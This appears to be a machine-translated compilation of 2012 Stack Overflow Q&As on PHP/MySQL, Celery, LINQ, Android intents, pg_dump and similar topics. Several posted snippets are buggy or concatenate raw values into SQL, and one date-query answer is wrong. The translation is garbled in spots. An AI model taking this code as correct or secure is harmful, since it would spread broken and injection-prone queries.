此后，我的管理员对上下文切换的使用得到了澄清。考虑到他的澄清，问题似乎在于正在进行大量相对较小的调用，这将需要数据库服务器在依次处理每个调用时将它们排入队列，从而在脚本等待时延长响应时间他们要求的数据。那么，是否有任何策略可以组合这些数据库调用，或者调整 MVC 结构的 PHP 应用程序调用数据库的方式，以便脚本不会一直等待数据库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:24:51.407

您有 SQL Server 性能问题，将其作为 SQL Server 性能故障排除来处理。有一些众所周知的方法，例如[Waits 和 Queues](http://technet.microsoft.com/en-us/library/cc966413.aspx)。SQL Server[性能故障排除流程图](http://sqlcat.com/sqlcat/b/presentations/archive/2008/04/18/troubleshooting-sql-server-2005-2008-performance-and-scalability-flowchart.aspx)很好地综合了各种文章、工具、方法和指标，供您使用，以识别瓶颈。

Saying that the problem is 'context switching' is non-informative, unhelpful and unactionable. For the record, there is not even such concept as 'context switching' in SQL Server troubleshooting because of the very specific way [SQL Server scheduling architecture](http://msdn.microsoft.com/en-us/library/ms189267%28v=sql.105%29.aspx) works. This is not how SQL Server performance troubleshooting is done, it is not even close to true root cause analysis. You need to identify the problem before you can attempt a solution. If your admin cannot help you, seek specialized help from qualified consultants.

And yes, if you can cache anything in the client and avoid querying the server is always, by definition, good. If the client and proxies can cache the page and avoid even hitting your HTTP server, is even better. These are true with any technology stack.

> there are a lot of relatively small calls being made, which would require the database server to enqueue them as it handles each one in turn, driving up the response time as the scripts wait for their requested data. Are there any strategies, then, for combining these database calls

There is no silver bullet. Consider though that a well tuned database can drive **a lot** of small requests per second (many thousands per second) w/o problems. Did you measure metrics in:

*   [SQL Server, Databases Object](http://msdn.microsoft.com/en-us/library/ms189883%28v=sql.105%29.aspx)
*   [SQL Server, Transactions Object](http://msdn.microsoft.com/en-us/library/ms189038%28v=sql.105%29)
*   [SQL Server, Wait Statistics Object](http://msdn.microsoft.com/en-us/library/ms190732%28v=sql.105%29)
*   [SQL Server, General Statistics Object](http://msdn.microsoft.com/en-us/library/ms190697%28v=sql.105%29)
*   [SQL Server, Access Methods Object](http://msdn.microsoft.com/en-us/library/ms177426%28v=sql.105%29)
*   [SQL Server, Buffer Manager Object](http://msdn.microsoft.com/en-us/library/ms189628%28v=sql.105%29)

*These* are interesting metrics that can tell a lot where you should focus your effort.

# heroku - 在 Heroku 上运行时，如何解决 celeryd 的退出超时问题（错误 R12）？

> ID：12318747
> 
> 赞同：13
> 
> 时间：2012-09-07T13:07:30.690
> 
> 标签：heroku, celery, django-celery, celeryd

我在 Heroku dyno 上运行 celeryd。当我关闭它并且它之前已处理（甚至完成）至少一项任务时，它没有正确关闭并且我从 Heroku 收到错误 R12（退出超时）。

这是我从我的`Procfile`（通过 Django 和 django-celery）运行 celeryd 的方式：

```
celeryd: python manage.py celeryd -E --loglevel=INFO 
```

这是我正在做的事情来触发它：

```
> heroku ps:scale web=0 celeryd=0 --app myapp 
```

这是我得到的日志输出：

```
2012-09-07T12:56:31+00:00 heroku[celeryd.1]: State changed from up to down
2012-09-07T12:56:31+00:00 heroku[api]: Scale to celeryd=0, web=1 by mail@mydomain.com
2012-09-07T12:56:32+00:00 heroku[web.1]: State changed from up to down
2012-09-07T12:56:32+00:00 heroku[api]: Scale to web=0 by mail@mydomain.com
2012-09-07T12:56:34+00:00 heroku[celeryd.1]: Stopping all processes with SIGTERM
2012-09-07T12:56:35+00:00 heroku[web.1]: Stopping all processes with SIGTERM
2012-09-07T12:56:37+00:00 heroku[web.1]: Process exited with status 143
2012-09-07T12:56:43+00:00 heroku[celeryd.1]: Error R12 (Exit timeout) -> At least one process failed to exit within 10 seconds of SIGTERM
2012-09-07T12:56:43+00:00 heroku[celeryd.1]: Stopping remaining processes with SIGKILL
2012-09-07T12:56:45+00:00 heroku[celeryd.1]: Process exited with status 137 
```

最初，我在 celery 2.5.5 上遇到过这种情况。现在我升级到 3.0.9，我仍然有同样的问题。

据我所知，我的任务已经全部完成。通过在 celery dyno 上运行单个任务，给它足够的时间来完成然后关闭 dyno，这个错误可以可靠地重现。

我不知道还要检查什么。知道如何解决这个问题吗？当任务已经完成时，什么会阻止 celeryd 响应 Heroku 的 SIGTERM？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-07T04:49:19.430

我遇到了同样的问题。我不确定，但它[可能已修复](http://docs.celeryproject.org/en/latest/changelog.html#fixes)：

> 带有 -B 参数的 Worker 没有正确关闭节拍实例。

因此，如果您在工作实例中使用 celery beat，则可能需要升级。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-06-26T20:36:38.103

在我看来，这听起来像是 celery 没有捕捉到`SIGTERM`信号并对它做出反应，一直等到信号`SIGKILL`到来。

这个拉取请求可能会帮助你： [https ://github.com/cybertoast/celery/commit/e9a007b982b0f9268174ae94b351a9275eaef4a3](https://github.com/cybertoast/celery/commit/e9a007b982b0f9268174ae94b351a9275eaef4a3)

# php - 使用 MySQL 的两个日期之间的事件

> ID：12318750
> 
> 赞同：-1
> 
> 时间：2012-09-07T13:07:38.763
> 
> 标签：php, mysql

其实我想问一个简单的问题！我有一个名为**events**的表，主要字段为 ( **'name','creation_date','ending_date'** )。现在我想做的是，获取今天日期和到期日期之间的所有事件。谁能帮我解决这个问题。

请告诉我如何以安全的方式获取今天和到期日之间的所有事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:11:01.133

```
SELECT * FROM events WHERE CURRENT_DATE BETWEEN creation_date AND ending_date 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:12:44.020

```
SELECT * FROM events WHERE (ending_date - NOW() ) <0 ; 
```

# java - Java SE 中未识别的组件

> ID：12318758
> 
> 赞同：0
> 
> 时间：2012-09-07T13:07:49.083
> 
> 标签：java

这里有没有人知道 Java SE 中的组件是什么类型的？或者，你有什么可以向我建议的，只是为了拥有这种组件？

图片：[http ://s10.postimage.org/3msnaw0s7/image.jpg](http://s10.postimage.org/3msnaw0s7/image.jpg)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:15:50.733

做到这一点的最佳方法是像[本示例中那样组合](http://eppleton.de/blog/?p=970)[JScrollPane](http://docs.oracle.com/javase/6/docs/api/javax/swing/JScrollPane.html)。图片右侧的项目需要组合组件才能获得结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:35:56.233

它被称为任务窗格。您可以查找构建教程，例如 [http://www.java2s.com/Code/Java/Swing-Components/TaskPanewindowhomestyle.htm](http://www.java2s.com/Code/Java/Swing-Components/TaskPanewindowhomestyle.htm)，挖掘像 swingx 这样的组件库或从像 jidesoft 这样的公司购买商业组件。 com

# php - 如何规范化标签表

> ID：12318761
> 
> 赞同：0
> 
> 时间：2012-09-07T13:07:59.677
> 
> 标签：php, mysql, database, normalization

我有这样的桌子：

```
post:
+----------------+-----------+
| article_id     | tags      | 
+----------------+-----------+
| 1              |  x1,x2,x3| 
| 2              |  x1,x4,x5 | 
+----------------+-----------+ 
```

我想要做的是规范化它，所以我创建了另外 2 个表：

```
tags:
+----------------+-----------+
| tag_id         | tag_name  | 
+----------------+-----------+
| 1              |    x1     | 
| 2              |    x2     | 
| 3              |    x3     |
+----------------+-----------+

post_tag:
+----------------+-----------+
| id_post         | id_tag  | 
+----------------+-----------+
| 1              |    1     | 
| 1              |    2     | 
| 2              |    1     |
+----------------+-----------+ 
```

我已经将所有标签从 post 表导出到 tags 表，现在每个标签在 tags 表中都有自己的 id，但是当我在考虑如何使用 post_tag 表时我很困惑？

编辑：questin 是如何填充 post_tag 表，查询会是什么样子？

像这样试过

```
$sql=mysql_query("SELECT * FROM post"); 
    while($row=mysql_fetch_array($sql)) {
        $article_id=$row['article_id'];
  $all_tags =$row['tags'];      
  $tags= explode(",",$all_tags);                                
    foreach($all_tags as $tag) {
     $sql2=mysql_query("SELECT * FROM tags WHERE tag_name = '$tag'");
      while($row=mysql_fetch_array($sql2)) {                               $tag_id=$row['tag_id'];                                  $q = "INSERT INTO post_tag (id_post, id_tag) VALUE ('$article_id', $tag_id')";
        $r = mysql_query($q);
      }
    }
} 
```

但它没有写完整的 post_tag 表

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:13:54.653

对于帖子的每个标签，您在 post_tag 表中插入一个条目。这称为 m 对 n 关系。去谷歌上查询 ;）

*   post_id：1，tag_id：1
*   post_id：1，tag_id：2
*   post_id：1，tag_id：3

邮政

*   post_id

标签

*   tag_id
*   标签名称

post_tag

*   post_id
*   tag_id

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-10T12:58:25.953

我明白了，你想用一个 sql-query 来解决你的问题，但这并不方便。尝试使用 php-power ，你会成功的。

php方式。1.创建表`tags`和`posts_tags`（就像你在问题中描述的那样）。2\. 在 php 中从当前`post`表中获取所有行并循环它：

```
foreach($query_results as $row) {
  $article_id = $row['article_id];
  $tags = explode('|', $row['tags']);
  foreach($tags as $tag) {
    // here check if this tag exists in your new `tags` table (by tag's name). If it is, save its id in $tag_id variable.
    // if a tag don't exists then insert it. And put its new id (mysql returns it after inserting) into $tag_id.
    // After that add a row ($article_id, $tag_id) to table `posts_tags`
  }
} 
```

`tags`然后从旧表中删除列`post`。利润！

`tags`ps 在表中的标签名称和表中的对 (article_id, tag_id) 上创建唯一索引`posts_tags`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-10T14:33:46.543

也许这个会起作用？

```
$sql= mysql_query("SELECT * FROM post"); 
while($row=mysql_fetch_array($sql)) {
    $article_id=$row['article_id'];
    $all_tags = $row['tags'];      
    $tags = explode(",",$all_tags);              
    foreach($all_tags as $tag_title) {
        $tag_id = null;
        $tag=mysql_fetch_assoc(mysql_query('SELECT * FROM tags WHERE tag_name = "'.$tag_title.'"'));
        if ($tag) {
            $tag_id = $tag['tag_id']; 
        } else {
            mysql_query('INSERT INTO tags SET tag_name = "'.$tag_title.'"');
            $tag_id = mysql_insert_id();
        } 
        $q = "INSERT INTO post_tag (id_post, id_tag) VALUE ('$article_id', $tag_id')";
        $r = mysql_query($q);
    }
} 
```

运行循环后，您需要删除表中的旧`post`列

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:22:10.210

假设您有一个名为 的帖子`my cat!`，它的 id 为`1`。您希望向其中添加`cats`标签`home`。

您应该首先在标签表中创建标签`cats`（`home`如果它们尚不存在）。假设他们是`cats | 2`和`home | 4`（数字是他们的 id）。

然后，您需要在 post_tag 表中存储值`1 | 2`和`1 | 4`，其中第一个值是帖子的 id，第二个值是标签的 id。

要查找帖子编号 1 的标签，您需要类似

`SELECT Tags.name FROM Tags, Tags_Posts WHERE Tags_Posts.post_id = 1 AND Tags.id = Tags_Posts.tag_id`

# linq - LINQ 查询布尔值传入不同的 Int

> ID：12318766
> 
> 赞同：0
> 
> 时间：2012-09-07T13:08:17.530
> 
> 标签：linq, linq-to-sql

下午，我从一个文本框中传入一个 bool 值，我需要检查它是真还是假，然后添加正确的代码类型 (int) 以供搜索。

例如

```
if (hasASIN == true)
{
    int show = 5;
}
else {
    int show = 1, 2, 3, 4 (these are the other code types)
} 
```

然后我需要在我的 LINQ 语句中添加一个 where 子句。

```
where a.codeType == show (need to have this maybe in a || (or) bit so i can use the other code types) 
```

下面是我现有的 LINQ 代码

```
 var query = from a in dc.aboProducts
             join t in dc.tweProducts on a.sku equals t.sku

             where (string.IsNullOrEmpty(productSku) || productSku == t.sku)
             where (string.IsNullOrEmpty(productAsin) || productAsin == a.asin)
             where (string.IsNullOrEmpty(productName) || t.title.Contains(productName))
             where (string.IsNullOrEmpty(productBrand) || t.brand.Contains(productBrand))
             where a.amzPrice >= priceFrom && a.amzPrice <= (priceTo)
             where a.amzLive == isLive 

             select new GetProducts
             {
                productid = Convert.ToInt32(t.id),
                sku = t.sku,
                title = t.title,
                tweprice = Convert.ToString(t.twePrice),
                stock = Convert.ToInt32(t.stock),
                asin = a.asin,
                amzprice = Convert.ToString(a.amzPrice),
                amzlive = Convert.ToBoolean(a.amzLive),
                lastupdated = Convert.ToDateTime(t.lastUpdated)
             };
  return query.ToList(); 
```

我希望我已经解释过了，如果不能随意询问:) 提前谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:33:20.287

我会`int show`改为`IEnumerable<int> show`. 然后你可以做你的if语句

```
IEnumerable<int> show;

if (hasASIN == true)
{
     show = new[] {5};
}
else 
{
     show = new[] {1, 2, 3, 4};
}

var query = .... 
```

在您的查询中，您可以拥有`where show.Contains(a.codeType)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T15:46:37.430

经过大量搜索，我找到了一个很好的答案......

```
where (hasASIN == true && a.codeType == 5) || (a.codeType == 1 || a.codeType == 2 || a.codeType == 3 || a.codeType ==4) 
```

# java - 如何对jar文件进行反混淆

> ID：12318772
> 
> 赞同：3
> 
> 时间：2012-09-07T13:08:28.210
> 
> 标签：java, jar, deobfuscation

是否有任何用于反混淆的开源工具？无法读取显示类/方法为 A/B/C 等的反编译文件

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T13:12:03.023

据我所知，没有这样的工具。我无法想象这是可能的，因为反混淆工具无法知道为方法和类赋予什么有意义的名称。

这就是人们混淆的原因。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-07T13:27:45.080

*唯一能以有意义的*方式去混淆的开源工具就是你的头脑。

逆向工程很难，需要耐心、毅力、咖啡因、ESP 和星际迷航。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T13:11:52.203

问题是，一旦 jar 文件被混淆，原始名称就会被破坏，并且通常会被缩短的名称替换。您可以尝试将混淆文件添加到项目中并使用重构工具替换更有意义的名称，因为您重构代码时为类赋予更有意义的名称，因为它们的目的变得更加清晰

# php - 带有 CDN 的 PHP 缓存标头

> ID：12318778
> 
> 赞同：0
> 
> 时间：2012-09-07T13:08:52.113
> 
> 标签：php, apache, .htaccess, cache-control

我正在尝试使用 php header() 函数为我的页面设置缓存标头。我有一个缓存 http 请求的 CDN。我在这里想要实现的是 CDN 应该将我的页面缓存 2 天，并且浏览器应该每 5 分钟检查一次 CDN 的新版本。

```
Cache-Control: max-age=300, s-maxage=172800, public 
```

这个 avoe 缓存标头有效吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T15:37:04.513

> 这个 avoe 缓存标头有效吗？

为什么你不知道你的流量？

[手册](http://www.ietf.org/rfc/rfc2616.txt)：

```
s-maxage
   If a response includes an s-maxage directive, then for a shared
   cache (but not for a private cache), the maximum age specified by
   this directive overrides the maximum age specified by either the
   max-age directive or the Expires header. 
```

是的，它应该可以工作 - 但在客户端上使用比在中间代理上更短的到期时间是没有意义的（除非客户端可能在不同的 CDN 区域之间移动并且内容是特定于 CDN 区域的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T14:19:06.647

expires 标头是您要查找的标头，它告诉所有缓存相关表示的新鲜时间。在那之后，缓存将始终与原始服务器核对以查看文档是否已更改。

此外，如果您的页面没有密码保护，请使用`must-revalidate`.

您可以在 CDN 上使用一种方法将您的 TTL 设置为 2 天

# javascript - JavaScript：从对象数组中获取唯一值及其计数？

> ID：12318783
> 
> 赞同：7
> 
> 时间：2012-09-07T13:09:16.517
> 
> 标签：javascript, jquery

使用 jQuery，我如何遍历一个对象，并通过每个值的计数来获取键的唯一值？

例如，对于这个数组：

```
var electrons = [
    { name: 'Electron1', distance: 1 }, 
    { name: 'Electron2', distance: 1 }, 
    { name: 'Electron3', distance: 2 }, 
    { name: 'Electron4', distance: 2 }, 
    { name: 'Electron5', distance: 2 }, 
    { name: 'Electron6', distance: 2 }, 
    { name: 'Electron7', distance: 2 }, 
    { name: 'Electron8', distance: 2 }, 
    { name: 'Electron9', distance: 2 }, 
    { name: 'Electron10', distance: 2 }, 
    { name: 'Electron11', distance: 3 }, 
]; 
```

我想找回以下内容：

```
var distance_counts = {1: 2, 2: 8, 3: 1}; 
```

我有这个，它有效，但有点笨拙：

```
var radius_counts = {};
for (var i = 0; i < electrons.length; i++) { 
    if (electrons[i].distance in radius_counts) { 
         radius_counts[electrons[i].distance] += 1;
    } else { 
         radius_counts[electrons[i].distance] = 1;
    } 
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T14:12:29.160

您可以将[map](http://api.jquery.com/jQuery.map/ "jQuery.map()")用于此目的：

```
var distances = {};
$.map(electrons,function(e,i) {
   distances[e.distance] = (distances[e.distance] || 0) + 1;
}); 
```

或者

```
var distances = {};
$.each(electrons,function(i,e) {
   distances[this.distance] = (distances[this.distance] || 0) + 1;
}); 
```

我还可以向您指出，虽然这段代码看起来不错且紧凑，但这通常不会更快。更好地使您的代码更快，更易于查看：

```
var distances = {},e;
for (var i = 0,l=electrons.length; i < l; i++) { 
    e = electrons[i];
    distances[e.distance] = (distances[e.distance] || 0) + 1;
} 
```

# android - Android - 以编程方式剪切可绘制图像

> ID：12318786
> 
> 赞同：3
> 
> 时间：2012-09-07T13:09:30.723
> 
> 标签：android, drawable

如何从可绘制图像中剪切一些像素？就像，我有一个单杠，我只想显示那个单杠的 50%。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-07T13:50:51.180

这是从给定图像中裁剪图像的方式：

```
// Given image is named "girl" in drawable folder
Bitmap image = BitmapFactory.decodeResource(getResources(), R.drawable.girl).copy(Config.ARGB_8888, true);
// Create a bit map with width and heigh = 100 pixel
Bitmap image2 = Bitmap.createBitmap(100, 100, Config.ARGB_8888);
for(int i = 0; i < 100; i++){
    for(int j = 0; j < 100; j++){
            // Set color of each pixel of created image to color of given image                     
            mage2.setPixel(i, j, image.getPixel(i, j));
    }
} 
```

对于您的问题，只需创建一个宽度和高度等于给定图像宽度和高度一半的图像，然后在您想要的任何位置设置任何像素！

# android - getIntExtra() 和 putExtra()？

> ID：12318791
> 
> 赞同：4
> 
> 时间：2012-09-07T13:09:40.817
> 
> 标签：android, android-intent

我读了 Hello Android 书，但我不理解以下代码。我不知道，getIntExtra() 和 putExtra() 在这段代码中该怎么做。

```
 private void startGame(int i) {
     Log.d(TAG, "clicked on " + i);
     Intent intent = new Intent(Sudoku.this, Game.class);
     intent.putExtra(Game.KEY_DIFFICULTY, i);
     startActivity(intent);
 } 
```

游戏.java

```
public class Game extends Activity {
    private static final String TAG = "Sudoku" ;
    public static final String KEY_DIFFICULTY ="org.example.sudoku.difficulty" ;
    public static final int DIFFICULTY_EASY = 0;
    public static final int DIFFICULTY_MEDIUM = 1;
    public static final int DIFFICULTY_HARD = 2;
    private int puzzle[] = new int[9 * 9];
    private PuzzleView puzzleView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate" );
        int diff = getIntent().getIntExtra(KEY_DIFFICULTY,DIFFICULTY_EASY);
        puzzle = getPuzzle(diff);
        calculateUsedTiles();
        puzzleView = new PuzzleView(this);
        setContentView(puzzleView);
        puzzleView.requestFocus();
    }
    // ...
} 
```

我遇到的问题是您在 Game 类中设置了一个本地整数（'diff'）。默认值为零（简单），然后立即将其传递给 getPuzzle 方法……。用户输入值（实际值都很好）如何找到它进入 getPuzzle 方法的方式？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-07T13:14:49.533

这段代码：

```
 Intent intent = new Intent(Sudoku.this, Game.class); 
 intent.putExtra(Game.KEY_DIFFICULTY, i); 
 startActivity(intent); 
```

创建一个意图，当使用 执行时`startActivity`，会做两件事：

*   它开始一个新的类活动`Game`（由参数指定`Game.class`）和
*   它将（= 用户输入）传递`i`到活动中，并用`KEY_DIFFICULTY`.

在活动中，这一行：

```
 int diff = getIntent().getIntExtra(KEY_DIFFICULTY, DIFFICULTY_EASY); 
```

读取在`KEY_DIFFICULTY`用于启动活动的意图中设置的值。因此，`diff`现在包含用户选择的值（或者`DIFFICULTY_EASY`，如果活动是通过*未*设置的不同意图启动的`KEY_DIFFICULTY`）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:18:10.040

Intents 用于在 android 中以编程方式启动 Activity。意图可以携带数据，您将其传递给新启动的活动。

```
startGame(int i) 
```

有意图地开始新的游戏活动。为意图添加额外内容意味着，您正在将数据传递给意图。启动的活动（在您的情况下为 Game.java）然后可以从意图中访问这个额外的内容。

它是一种在活动之间传递数据的机制。

第一个参数 (KEY_DIFFICULTY) 是标识额外内容的密钥。因此，如果您使用键“mykeyexample”为意图添加额外内容，则必须在另一个活动中使用相同的键“mykeyexample”进行获取，以从意图中获取所需的额外内容。

希望这可以帮助

# postgresql - pg_dump 是否需要 -C 参数来恢复数据库？

> ID：12318792
> 
> 赞同：2
> 
> 时间：2012-09-07T13:09:40.900
> 
> 标签：postgresql

我的意图是使用以下方法转储数据库：

```
pg_dump -U postgres -h localhost -p 5432 MYDB | gzip > database_dump.gz 
```

并将其恢复到另一个环境：

```
gunzip -c database_dump.gz | ssh 10.10.10.10 \
  psql -1 -U postgres -h localhost -p 5432 MYDB 
```

在第二个环境中恢复数据库之前，我将删除现有数据库以便为新转储（包含较新数据）让路。

这是我的问题：我是否需要`-C`在我的 pg_dump 语句中指定参数，以便输出的转储文件包含一个`CREATE DATABASE`语句？我注意到没有参数，转储文件不包含`CREATE DATABASE`语句。

根据`-C`参数的 9.1 文档，“此选项仅对纯文本格式有意义。对于存档格式，您可以在调用 pg_restore 时指定该选项。” 我不肯定这意味着什么。正如您在上面看到的，我正在使用 psql 而不是 pg_restore 进行恢复。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:30:56.460

这意味着`psql`用于重新创建数据库，您需要添加`-C`.

[`pg_restore`](http://www.postgresql.org/docs/9.1/static/app-pgrestore.html)是专门用于从`pg_dump`非纯文本格式生成的脚本中恢复数据库的工具。您不能像`psql`. 另一方面，您可以选择列出存档中的对象并选择需要恢复的对象。另一个有用的选项是设置处理存档的并发作业数。在某些情况下，这可以大大加快恢复速度。

如果您没有指定`pg_dump`使用该`-F`选项的输出格式，它将为您创建一个纯文本存档。

# jsf-2 - JSF 视图参数仅适用于同一页面

> ID：12318793
> 
> 赞同：1
> 
> 时间：2012-09-07T13:09:46.257
> 
> 标签：jsf-2

可能我在这里遗漏了一些东西。

我有一个带有菜单的模板，带有 JSF 页面的选项传递参数：

```
<rich:menuItem label="Todos" action="#{mainMenuCtrl.listTickets}">
  <f:param name="baseLocation" value=""/>
  <f:param name="ticketStatus" value="Solicitado"/>
</rich:menuItem>
<rich:menuItem label="H. General" action="#{mainMenuCtrl.listTickets}">
  <f:param name="baseLocation" value="HGN"/>
  <f:param name="ticketStatus" value="Solicitado"/>
</rich:menuItem> 
```

控制器只是重定向到页面：

```
public String listTickets() {
  return "ticketsList.xhtml?faces-redirect=true&includeViewParams=true";
} 
```

ticketList.xhtml 有以下`metadata`部分：

```
<f:metadata>
  <f:viewParam name="baseLocation" value="#{ticketsListCtrl.baseLocation}" converter="es.caib.gesma.gesman.data.converter.LocationConverterByShortCode"/>
  <f:viewParam name="ticketStatus" value="#{ticketsListCtrl.ticketStatus}" converter="es.caib.gesma.gesman.data.converter.TicketStatusConverter"/>
  <f:event type="preRenderView" listener="#{ticketsListCtrl.retrieveTickets()}" />  
</f:metadata> 
```

问题是，当我在另一个`index.xhtml`使用相同模板的`ticketsList.xhtml`页面（

```
../ticketsList.xhtml?baseLocation=&ticketStatus= 
```

当我从 中单击同一项目时`ticketsList.xhtml`，它会显示正确的 URL，并且从那里一切正常。

```
../ticketsList.xhtml?baseLocation=HGN&ticketStatus=Solicitado 
```

谁能指出我为什么从其他页面单击时缺少视图参数？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:13:31.510

这`includeViewParams`将包括**当前**视图的视图参数，而不是目标视图的视图参数。

您基本上还需要定义要包含的视图参数`<f:viewParam>`，`index.xhtml`或者寻找替代方法。

# c# - 在 DataSourceUpdateMode.Never 上绑定源提交

> ID：12318794
> 
> 赞同：0
> 
> 时间：2012-09-07T13:09:49.137
> 
> 标签：c#, winforms, data-binding

我反对

```
bindingSource.DataSource = object 
```

我必须在 Windows 窗体上实现`Save`， 因为我有所有的属性项 和 bindingSource.ResetBindings(false); -> 工作正常`Revert Changes`
`Revert Changes``DataSourceUpdateMode.Never`

但是因为`Save`我需要做一个`Commit` `bindingSource.EndEdit();`- 它不会更新我的对象

我试着做

```
TextEdit.DataBindings.DefaultDataSourceUpdateMode = DataSourceUpdateMode.OnValidation;
bindingSource.EndEdit();
TextEdit.DataBindings.DefaultDataSourceUpdateMode = DataSourceUpdateMode.Never; 
```

但它没有用，
如果我让 DataSourceUpdateMode.OnValidation ，它`Save`会正常工作，但`Revert changes`不会工作
，我不想复制对象有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T06:41:27.700

当您将`DataSourceUpdateMode`枚举设置为`Never`并在绑定到 的多个控件上使用此方法时`BindingSource`，会出现各种问题：

```
it resets the values of other controls, or
it works for one control but not for the other. 
```

[http://msdn.microsoft.com/en-us/library/system.windows.forms.binding.writevalue%28v=vs.90%29.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.binding.writevalue%28v=vs.90%29.aspx)

[http://weblogs.asp.net/psteele/archive/2006/10/10/Data-Binding-fails-me-again_2E002E002E00_.aspx](http://weblogs.asp.net/psteele/archive/2006/10/10/Data-Binding-fails-me-again_2E002E002E00_.aspx)

# titanium-mobile - 钛配置错误

> ID：12318796
> 
> 赞同：0
> 
> 时间：2012-09-07T13:09:54.650
> 
> 标签：titanium-mobile

我花了很多时间来修复钛移动网络应用程序运行过程，我只是试图执行一个创建的示例移动网络应用程序，同时运行我在屏幕下方的应用程序。它没有显示确切的结果。在第一次它工作得很好。但不能用它配置android sdk。所以在多次卸载后经历了灌输![在此处输入图像描述](../Images/b70b74158294c5d544db42c47533e237.png)。运行时低于错误屏幕。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T20:38:49.087

Titanium Mobile 的解决方案似乎是清理项目并查看是否再次出现错误。曾经有一两次，在更改了一些看起来很小的东西并返回了一个奇怪的错误之后，我得到了一些奇怪的错误。在某些情况下，清理项目似乎会有所帮助。

从 IDE 中转到 Project=>Clean...

# android - 在已安装的第 3 方应用程序中默认打开特定文件？

> ID：12318797
> 
> 赞同：0
> 
> 时间：2012-09-07T13:09:57.170
> 
> 标签：android, pdf, android-intent, launch

默认情况下，是否可以通过从我的 android 应用程序传递意图在启动应用程序时在第 3 方 PDF 阅读器（例如 Adob​​e 阅读器）中打开特定的 PDF 文件？

这可能吗？应该如何传递意图来实现这一目标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:17:17.233

是的，这是可能的。

您将需要启动`Intent`具有`ACTION_VIEW`相应 mime 类型的 with，并且该文档应在 3d 方 pdf 阅读器中打开（如果您的手机上有可用的话）。

```
String path="...../file.pdf";
Intent intent=new Intent(Intent.ACTION_VIEW);
intent.setDataAndType(Uri.fromFile(new File(path)), "application/pdf");
startActivity(intent); 
```

# javascript - ResolveUrl 是否也适用于 ../../？

> ID：12318800
> 
> 赞同：0
> 
> 时间：2012-09-07T13:10:00.260
> 
> 标签：javascript, asp.net, html

我想知道，ResolveUrl 只有在你做 ../ 或 / 时才有效，还是它也适用于 ../../ ？

因此，对于使用外部 javascript 文件时我使用 ResolveUrl 的示例

```
<script src="../../js/Plugins/jquery.contextmenu.js" type="text/javascript"></script> 
```

我用 ResolveUrl 替换了所有只有 ../ 的 scrips 标签，它似乎可以工作。它也适用于上面的代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:30:53.970

是的，它也适用，但我建议使用一些上下文路径而不是使用大量`../`.

# glassfish - 从 appclient 访问远程 Glassfish 服务器

> ID：12318807
> 
> 赞同：0
> 
> 时间：2012-09-07T13:10:27.570
> 
> 标签：glassfish

我在不同的机器（本地主机和 192.168.0.5）上有两台 Glassfish 3.1.2 服务器。我还有一个 appclient 客户端应用程序，它调用 EJB 并从 JMS 队列中获取消息。我必须使用 appclient 容器，因为如果我想使用事务处理会话到 JMS 队列，这是我唯一的选择。

如果我通过 appclient.bat 脚本在 localhost 上运行 appclient，我必须向脚本提供 targetserver 参数，如下所示： appclient.bat -targetserver localhost -jar appClient.jar -clientArg1 -clientArg2

这使得 appclient 连接到在 localhost 上运行的 Glassfish。现在我想在我的客户端 java 应用程序中连接到 192.168.0.5 上的 Glassfish，而 appclient 连接到 locahost。

我已经尝试将参数设置为 InitialContext，但它们没有被采用。

```
Properties props = new Properties();
props.setProperty("java.naming.factory.initial", "com.sun.enterprise.naming.impl.SerialInitContextFactory");
props.setProperty("java.naming.factory.url.pkgs", "com.sun.enterprise.naming");
props.setProperty("java.naming.factory.state", "com.sun.corba.ee.impl.presentation.rmi.JNDIStateFactoryImpl");
props.setProperty("org.omg.CORBA.ORBInitialHost", sourceURL);
props.setProperty("org.omg.CORBA.ORBInitialPort", "3700");
InitialContext ic = new InitialContext(props); 
```

对 EJB、JMS 队列等的引用总是取自由 targetserver 参数指定的 Glassfish 服务器。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T14:05:21.967

找不到解决方案，所以我使用 targetserver 参数多次运行 appclient 批处理文件。

# android - Android Support4Demos 的 FragmentTabs 示例中的两个框架布局

> ID：12318808
> 
> 赞同：4
> 
> 时间：2012-09-07T13:10:28.450
> 
> 标签：android, android-layout, android-fragments, android-framelayout

我是 Android 中的 Fragment 的新手，我指的是 Fragments 演示示例提供了 supprotv4 兼容性库。

